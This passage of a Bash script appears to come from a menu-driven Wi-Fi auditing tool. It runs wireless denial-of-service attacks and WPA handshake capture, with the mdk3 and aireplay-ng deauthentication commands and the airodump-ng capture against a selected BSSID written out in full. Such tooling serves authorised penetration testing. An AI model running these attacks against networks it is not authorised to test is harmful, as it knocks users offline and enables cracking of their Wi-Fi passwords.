			strtoprint=${hints[dos_hints|$randomhint]}
		;;
		"handshake_tools_menu")
			store_array hints handshake_hints "${handshake_hints[@]}"
			hintlength=${#handshake_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-${hintlength} -n 1)
			strtoprint=${hints[handshake_hints|$randomhint]}
		;;
		"attack_handshake_menu")
			store_array hints handshake_attack_hints "${handshake_attack_hints[@]}"
			hintlength=${#handshake_attack_hints[@]}
			((hintlength--))
			randomhint=$(shuf -i 0-${hintlength} -n 1)
			strtoprint=${hints[handshake_attack_hints|$randomhint]}
		;;
	esac

	echo_blue "---------"
	language_strings ${language} ${strtoprint} "hint"
	echo_blue "---------"
}

function main_menu() {

	clear
	clean_target_network_vars
	language_strings ${language} 101 "titlered"
	current_menu="main_menu"
	print_selections
	echo
	language_strings ${language} 47 "green"
	echo_blue "---------"
	language_strings ${language} 48
	language_strings ${language} 55
	language_strings ${language} 56
	echo_blue "---------"
	language_strings ${language} 118
	language_strings ${language} 119
	echo_blue "---------"
	language_strings ${language} 60
	language_strings ${language} 78
	language_strings ${language} 61
	print_hint ${current_menu}

	read main_option
	case ${main_option} in
		1)
			select_interface
		;;
		2)
			monitor_option
		;;
		3)
			managed_option
		;;
		4)
			dos_attacks_menu
		;;
		5)
			handshake_tools_menu
		;;
		6)
			credits_option
		;;
		7)
			language_option
		;;
		8)
			exit_script_option
		;;
		*)
			invalid_menu_option
		;;
	esac

	main_menu
}

function handshake_tools_menu() {

	clear
	language_strings ${language} 120 "titlered"
	current_menu="handshake_tools_menu"
	print_selections
	echo
	language_strings ${language} 47 "green"
	echo_blue "---------"
	language_strings ${language} 48
	language_strings ${language} 55
	language_strings ${language} 56
	language_strings ${language} 49
	language_strings ${language} 124 "blue"
	language_strings ${language} 121
	echo_blue "---------"
	language_strings ${language} 122
	echo_blue "---------"
	language_strings ${language} 123
	print_hint ${current_menu}

	read handshake_option
	case ${handshake_option} in
		1)
			select_interface
		;;
		2)
			monitor_option
		;;
		3)
			managed_option
		;;
		4)
			explore_for_targets_option
		;;
		5)
			capture_handshake
		;;
		6)
			clean_handshake_file
		;;
		7)
			return
		;;
		*)
			invalid_menu_option
		;;
	esac

	handshake_tools_menu
}

function clean_handshake_file() {

	echo
	readpath=0

	if [ -z ${enteredpath} ]; then
		language_strings ${language} 150 "blue"
		readpath=1
	else
		language_strings ${language} 151 "blue"
		ask_yesno 152
		if [ ${yesno} = "y" ]; then
			filetoclean=${enteredpath}
		else
			readpath=1
		fi
	fi

	if [ ${readpath} -eq 1 ]; then
		validpath=1
		while [[ "$validpath" != "0" ]]; do
			read_path "cleanhandshake"
		done
	fi

	handshakefilesize=`wc -c ${filetoclean} 2> /dev/null | awk -F " " '{print$1}'`
	echo
	if [ ${handshakefilesize} -gt 1024 ]; then
		wpaclean ${filetoclean} ${filetoclean} > /dev/null 2>&1
		language_strings ${language} 153 "yellow"
	else
		language_strings ${language} 159 "yellow"
	fi
	language_strings ${language} 115 "read"
}

function dos_attacks_menu() {

	clear
	language_strings ${language} 102 "titlered"
	current_menu="dos_attacks_menu"
	print_selections
	echo
	language_strings ${language} 47 "green"
	echo_blue "---------"
	language_strings ${language} 48
	language_strings ${language} 55
	language_strings ${language} 56
	language_strings ${language} 49
	language_strings ${language} 50 "blue"
	language_strings ${language} 51
	language_strings ${language} 52
	language_strings ${language} 53
	language_strings ${language} 54 "blue"
	language_strings ${language} 62
	language_strings ${language} 63
	language_strings ${language} 64
	echo_blue "---------"
	language_strings ${language} 59
	print_hint ${current_menu}

	read dos_option
	case ${dos_option} in
		1)
			select_interface
		;;
		2)
			monitor_option
		;;
		3)
			managed_option
		;;
		4)
			explore_for_targets_option
		;;
		5)
			mdk3_deauth_option
		;;
		6)
			aireplay_deauth_option
		;;
		7)
			wds_confusion_option
		;;
		8)
			beacon_flood_option
		;;
		9)
			auth_dos_option
		;;
		10)
			michael_shutdown_option
		;;
		11)
			return
		;;
		*)
			invalid_menu_option
		;;
	esac
	
	dos_attacks_menu
}

function capture_handshake() {

	if [[ -z ${bssid} ]] || [[ -z ${essid} ]] || [[ -z ${channel} ]] || [[ "$essid" = "(Hidden Network)" ]]; then
		echo
		language_strings ${language} 125 "yellow"
		language_strings ${language} 115 "read"
		explore_for_targets_option
	fi

	if [ "$?" != "0" ]; then
		return 1
	fi

	if [[ ${enc} != "WPA" ]] && [[ ${enc} != "WPA2" ]]; then
		echo
		language_strings ${language} 137 "yellow"
		language_strings ${language} 115 "read"
		return 1
	fi

	language_strings ${language} 126 "yellow"
	language_strings ${language} 115 "read"

	attack_handshake_menu "new"
}

function check_file_exists() {

	if [ ! -f $1 ]; then
		language_strings ${language} 161 "yellow"
		return 1
	fi
	return 0
}

function validate_path() {

	dirname=${1%/*}

	if [[ ! -d ${dirname} ]] || [[ "$dirname" = "." ]]; then
		language_strings ${language} 156 "yellow"
		return 1
	fi

	check_write_permissions ${dirname}
	if [ "$?" != "0" ]; then
		language_strings ${language} 157 "yellow"
		return 1
	fi

	lastcharmanualpath=${1: -1}
	if [ "$lastcharmanualpath" = "/" ]; then
		enteredpath="$1$standardhandshake_filename"
		language_strings ${language} 155 "yellow"
		return 0
	fi

	language_strings ${language} 158 "yellow"
	return 0
}

function check_write_permissions() {

	if [ -w ${1} ]; then
		return 0
	fi
	return 1
}

function read_path() {

	echo
	case ${1} in
		"handshake")
			language_strings ${language} 148 "green"
			read enteredpath
			if [ -z "$enteredpath" ]; then
				enteredpath=${handshakepath}
			fi
			validate_path ${enteredpath}
		;;
		"cleanhandshake")
			language_strings ${language} 154 "green"
			read filetoclean
			check_file_exists ${filetoclean}
		;;
	esac

	validpath="$?"
	return ${validpath}
}

function attack_handshake_menu() {

	if [ "$1" = "handshake" ]; then
		ask_yesno 145
		handshake_captured=${yesno}
		kill ${processidcapture} &> /dev/null
		if [ "$handshake_captured" = "y" ]; then

			handshakepath=`env | grep ^HOME | awk -F = '{print $2}'`
			lastcharhandshakepath=${handshakepath: -1}
			if [ "$lastcharhandshakepath" != "/" ]; then
				handshakepath="$handshakepath/"
			fi
			handshakefilename="handshake-$bssid.cap"
			handshakepath="$handshakepath$handshakefilename"

			language_strings ${language} 162 "yellow"
			validpath=1
			while [[ "$validpath" != "0" ]]; do
				read_path "handshake"
			done

			cp "$tmpdir$standardhandshake_filename" ${enteredpath}
			echo
			language_strings ${language} 149 "blue"
			language_strings ${language} 115 "read"
			return
		else
			echo
			language_strings ${language} 146 "yellow"
			language_strings ${language} 115 "read"
		fi
	fi

	clear
	language_strings ${language} 138 "titlered"
	current_menu="attack_handshake_menu"
	print_selections
	echo
	language_strings ${language} 47 "green"
	echo_blue "---------"
	language_strings ${language} 139
	language_strings ${language} 140
	language_strings ${language} 141
	echo_blue "---------"
	language_strings ${language} 147
	print_hint ${current_menu}

	read attack_handshake_option
	case ${attack_handshake_option} in
		1)
			capture_handshake_window
			rm -rf ${tmpdir}"bl.txt" > /dev/null 2>&1
			echo ${bssid} > ${tmpdir}"bl.txt"
			xterm +j -sb -rightbar -geometry 119x20+60+350 -T "mdk3 amok attack" -e mdk3 ${interface} d -b ${tmpdir}"bl.txt" -c ${channel} &
			sleeptimeattack=12
		;;
		2)
			capture_handshake_window
			${airmon} start ${interface} ${channel} > /dev/null 2>&1
			xterm +j -sb -rightbar -geometry 119x20+60+350 -T "aireplay deauth attack" -e aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface} &
			sleeptimeattack=12
		;;
		3)
			capture_handshake_window
			xterm +j -sb -rightbar -geometry 119x20+60+350 -T "wids / wips / wds confusion attack" -e mdk3 ${interface} w -e ${essid} -c ${channel} &
			sleeptimeattack=16
		;;
		4)
			return
		;;
		*)
			invalid_menu_option
			attack_handshake_menu "new"
		;;
	esac

	processidattack=$!
	sleep ${sleeptimeattack} && kill ${processidattack} &> /dev/null

	attack_handshake_menu "handshake"
}

function capture_handshake_window() {

	language_strings ${language} 143 "blue"
	echo
	language_strings ${language} 144 "yellow"
	language_strings ${language} 115 "read"

	rm -rf ${tmpdir}"handshake"* > /dev/null 2>&1
	xterm +j -sb -rightbar -geometry 119x20+1000+10 -T "Capturing Handshake" -e airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}"handshake" ${interface} &
	processidcapture=$!
}

function explore_for_targets_option() {

	echo
	language_strings ${language} 103 "titlered"
	language_strings ${language} 65 "green"

	check_monitor_enabled
	if [ "$?" != "0" ]; then
		return 1
	fi

	echo
	language_strings ${language} 66 "yellow"
	echo
	language_strings ${language} 67 "yellow"
	language_strings ${language} 115 "read"

	tmpfiles_toclean=1
	rm -rf ${tmpdir}"nws"* > /dev/null 2>&1
	rm -rf ${tmpdir}"clts.csv" > /dev/null 2>&1
	xterm +j -sb -rightbar -geometry 119x35+350+350 -T "Exploring for targets" -e airodump-ng -w ${tmpdir}"nws" ${interface}
	targetline=`cat ${tmpdir}"nws-01.csv" | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
	targetline=`expr ${targetline} - 1`

	head -n ${targetline} ${tmpdir}"nws-01.csv" &> ${tmpdir}"nws.csv"
	tail -n +${targetline} ${tmpdir}"nws-01.csv" &> ${tmpdir}"clts.csv"

	csvline=`wc -l ${tmpdir}"nws.csv" 2> /dev/null | awk '{print $1}'`
	if [ ${csvline} -le 3 ]; then
		echo
		language_strings ${language} 68 "yellow"
		language_strings ${language} 115 "read"
		return
	fi

	rm -rf ${tmpdir}"nws.txt" > /dev/null 2>&1
	rm -rf ${tmpdir}"wnws.txt" > /dev/null 2>&1
	i=0
	while IFS=, read exp_mac exp_fts exp_lts exp_channel exp_speed exp_enc exp_cypher exp_auth exp_power exp_beacon exp_iv exp_lanip exp_idlength exp_essid exp_key; do

		chars_mac=${#exp_mac}
		if [ ${chars_mac} -ge 17 ]; then
			i=$(($i+1))
			if [[ ${exp_power} -lt 0 ]]; then
				if [[ ${exp_power} -eq -1 ]]; then
					exp_power=0
				else
					exp_power=`expr ${exp_power} + 100`
				fi
			fi

			exp_power=`echo ${exp_power} | awk '{gsub(/ /,""); print}'`
			exp_essid=`expr substr "$exp_essid" 2 ${exp_idlength}`
			if [ ${exp_channel} -gt 14 ] || [ ${exp_channel} -lt 1 ]; then
				exp_channel=0
			else
				exp_channel=`echo ${exp_channel} | awk '{gsub(/ /,""); print}'`
			fi

			if [ "$exp_essid" = "" ] || [ "$exp_channel" = "-1" ]; then
				exp_essid="(Hidden Network)"
			fi

			exp_enc=`echo ${exp_enc} | awk '{print $1}'`

			echo -e "$exp_mac,$exp_channel,$exp_power,$exp_essid,$exp_enc" >> ${tmpdir}"nws.txt"
		fi
	done < ${tmpdir}"nws.csv"
	sort -t "," -d -k 4 ${tmpdir}"nws.txt" > ${tmpdir}"wnws.txt"
	select_target
}

function select_target() {

	clear
	language_strings ${language} 104 "titlered"
	language_strings ${language} 69 "green"
	echo_blue "-------------------------------------------------------"
	i=0
	while IFS=, read exp_mac exp_channel exp_power exp_essid exp_enc; do

		i=$(($i+1))

		if [ ${i} -le 9 ]; then
			sp1=" "
		else
			sp1=""
		fi

		if [[ ${exp_channel} -le 9 ]]; then
			sp2=" "
			if [[ ${exp_channel} -eq 0 ]]; then
				exp_channel="-"
			fi
		else
			sp2=""
		fi

		if [[ "$exp_power" = "" ]]; then
			exp_power=0
		fi

		if [[ ${exp_power} -le 9 ]]; then
			sp4=" "
		else
			sp4=""
		fi

		client=`cat ${tmpdir}"clts.csv" | grep ${exp_mac}`
		if [ "$client" != "" ]; then
			client="*"
			sp5=""
		else
			sp5=" "
		fi

		enc_length=${#exp_enc}
		if [ ${enc_length} -gt 3 ]; then
			sp6=""
		elif [ ${enc_length} -eq 0 ]; then
			sp6="    "
		else
			sp6=" "
		fi

		network_names[$i]=${exp_essid}
		channels[$i]=${exp_channel}
		macs[$i]=${exp_mac}
		encs[$i]=${exp_enc}
		echo -e " $sp1$i)$client  $sp5$exp_mac   $sp2$exp_channel    $sp4$exp_power%   $exp_enc$sp6   $exp_essid"
	done < ${tmpdir}"wnws.txt"
	echo
	if [ ${i} -eq 1 ]; then
		language_strings ${language} 70 "yellow"
		selected_target_network=1
		language_strings ${language} 115 "read"
	else
		language_strings ${language} 71
		echo_blue "-------------------------------------------------------"
		language_strings ${language} 3 "green"
		read selected_target_network
	fi

	while [[ ${selected_target_network} -lt 1 ]] || [[ ${selected_target_network} -gt ${i} ]]; do
		echo
		language_strings ${language} 72 "yellow"
		echo
		language_strings ${language} 3 "green"
		read selected_target_network
	done

	essid=${network_names[$selected_target_network]}
	channel=${channels[$selected_target_network]}
	bssid=${macs[$selected_target_network]}
	enc=${encs[$selected_target_network]}
}

function credits_option() {

	clear
	language_strings ${language} 105 "titlered"
	language_strings ${language} 73 "green"
	echo -e ${blue_color}"       ____        ____  __   _______"
	echo -e "___  _/_   | _____/_   |/  |_ \   _  \_______"
	echo -e "\  \/ /|   |/  ___/|   \   __\/  /_\  \_  __ \ "
	echo -e " \   / |   |\___ \ |   ||  |  \  \_/   \  | \/"
	echo -e "  \_/  |___/____  >|___||__|   \_____  /__|"
	echo -e "                \/                   \/"${normal_color}
	echo -e ${green_color}"                .-\"\"\"\"-."
	echo -e "               /        \ "
	echo -e "              /_        _\ "
	echo -e "             // \      / \\\\\ "
	echo -e "             |\__\    /__/|"
	echo -e "              \    ||    /"
	echo -e "               \        /"
	echo -e "                \  __  / "
	echo -e "                 '.__.'"
	echo -e "                  |  |"${normal_color}
	language_strings ${language} 74 "blue"
	language_strings ${language} 75 "blue"
	echo
	language_strings ${language} 85 "green"
	language_strings ${language} 107 "green"
	language_strings ${language} 115 "read"
}

function invalid_language_selected() {

	echo
	language_strings ${language} 82 "yellow"
	echo
	language_strings ${language} 115 "read"
	echo
	language_option
}

function invalid_menu_option() {

	echo
	language_strings ${language} 76 "yellow"
	language_strings ${language} 115 "read"
}

function invalid_iface_selected() {

	echo
	language_strings ${language} 77 "yellow"
	echo
	language_strings ${language} 115 "read"
	echo
	select_interface
}

function killing_script() {

	echo
	echo
	language_strings ${language} 12 "yellow"
	echo
	language_strings ${language} 115 "read"
	
	case ${current_menu} in
		"main_menu")
			main_menu
		;;
		"dos_attacks_menu")
			dos_attacks_menu
		;;
		"handshake_tools_menu")
			handshake_tools_menu
		;;
		"attack_handshake_menu")
			attack_handshake_menu "new"
		;;
		*)
			main_menu
		;;
	esac
}

function exit_script_option() {

	action_on_exit_taken=0
	echo
	language_strings ${language} 106 "titlered"
	language_strings ${language} 11 "blue"

	echo
	language_strings ${language} 165 "blue"

	if [ "$ifacemode" = "Monitor" ]; then
		ask_yesno 166
		if [ ${yesno} = "n" ]; then
			action_on_exit_taken=1
			language_strings ${language} 167 "multiline"
			${airmon} stop ${interface} > /dev/null 2>&1
			time_loop
			echo -e ${green_color}" Ok\r"${normal_color}

			if [ ${check_kill_needed} -eq 1 ]; then
				language_strings ${language} 168 "multiline"
				eval ${networkmanager_cmd}" > /dev/null 2>&1"
				time_loop
				echo -e ${green_color}" Ok\r"${normal_color}
			fi
		fi
	fi

	if [ ${tmpfiles_toclean} -eq 1 ]; then
		action_on_exit_taken=1
		language_strings ${language} 164 "multiline"
		clean_tmpfiles
		time_loop
		echo -e ${green_color}" Ok\r"${normal_color}
	fi

	if [ ${action_on_exit_taken} -eq 0 ]; then
		language_strings ${language} 160 "yellow"
	fi

	echo
	exit
}

function time_loop() {

	echo -ne " "
	for j in 0 1 2 3 4; do
		echo -ne "."
		sleep 0.035
	done
}

function airmon_fix() {

	airmon="airmon-ng"

	if hash airmon-zc 2> /dev/null; then
		airmon="airmon-zc"
	fi
}

function iwconfig_fix() {

	iwversion=`iwconfig --version | grep version | awk '{print $4}'`
	iwcmdfix=""
	if [ ${iwversion} -lt 30 ]; then
		iwcmdfix=" 2> /dev/null | grep Mode: "
	fi
}

function special_distro_features() {

	case ${distro} in
		"Kali")
			distroyear=`uname -a | grep -oP "20[0-9]{2}\-[0-9]{2}\-[0-9]{2}" | awk -F "-" '{print $1}'`
			if [ "$distroyear" = "2016" ]; then
				check_kill_needed=0
			fi
		;;
		"Wifislax")
			networkmanager_cmd="service restart networkmanager"
		;;
		"Backbox")
			check_kill_needed=0
		;;
		"Blackarch")
			check_kill_needed=0
		;;
	esac
}

function detect_distro() {

	compatible=0
	distro="Unknown Linux"
	check_kill_needed=1
	networkmanager_cmd="service network-manager restart"
	airmon_fix

	for i in "${known_compatible_distros[@]}"; do
		uname -a | grep ${i} -i > /dev/null
		if [ "$?" = "0" ]; then
			distro="${i^}"
			compatible=1
			break
		fi
	done

	if [ ${compatible} -eq 0 ]; then
		for i in "${known_working_nondirectly_compatible_distros[@]}"; do
			uname -a | grep ${i} -i > /dev/null
			if [ "$?" = "0" ]; then
				distro="${i^}"
				compatible=0
				break
			fi
		done
	fi

	special_distro_features

	echo -e ${yellow_color}"$distro Linux"${normal_color}
	echo

	if [ ${compatible} -eq 1 ]; then
		return
	fi

	check_compatibility
	if [ ${compatible} -eq 1 ]; then
		return
	fi

	language_strings ${language} 115 "read"
	exit_script_option
}

function print_known_distros() {

	for i in "${known_compatible_distros[@]}"; do
		echo -ne ${pink_color}"${i^} "${normal_color}
	done
	echo
}

function check_compatibility() {

	language_strings ${language} 5 "yellow"
	language_strings ${language} 108 "yellow"
	language_strings ${language} 115 "read"
	echo
	language_strings ${language} 109 "blue"
	toolsok=1
	toolstext=""

	for i in "${essential_tools[@]}"; do
		echo -ne "$i"
		time_loop
		if ! hash ${i} 2> /dev/null; then
			echo -e ${red_color}" Error\r"${normal_color}
			toolsok=0
		else
			echo -e ${green_color}" Ok\r"${normal_color}
		fi
	done

	if [ ${toolsok} -eq 0 ]; then
		echo
		language_strings ${language} 111 "yellow"
		echo
		return
	fi

	language_strings ${language} 110 "yellow"
	echo
	compatible=1
}

function welcome() {

	clear
	current_menu="main"
	autodetect_language

	language_strings ${language} 86 "titlered"
	language_strings ${language} 6 "blue"
	echo
	language_strings ${language} 7 "green"
	language_strings ${language} 114 "green"

	if [ ${autochanged_language} -eq 1 ]; then
		echo
		language_strings ${language} 2 "yellow"
	fi

	echo
	language_strings ${language} 8 "blue"
	print_known_distros
	echo
	language_strings ${language} 9 "blue"
	detect_distro
	language_strings ${language} 115 "read"

	select_interface
	main_menu
}

function autodetect_language() {

	autochanged_language=0
	lang=`locale | grep LANG | cut -d= -f2 | cut -d_ -f1`

	for lgkey in "${!lang_association[@]}"; do
		if [[ "$lang" = "$lgkey" ]] && [[ "$language" != ${lang_association["$lgkey"]} ]]; then
			autochanged_language=1
			language=${lang_association["$lgkey"]}
			break
		fi
	done
}

function echo_green() {

	echo -e ${green_color}"$*"${normal_color}
}

function echo_blue() {

	echo -e ${blue_color}"$*"${normal_color}
}

function echo_yellow() {

	echo -e ${yellow_color}"$*"${normal_color}
}

function echo_red() {

	echo -e ${red_color}"$*"${normal_color}
}

function echo_pink() {

	echo -e ${pink_color}"$*"${normal_color}
}

trap killing_script INT
welcome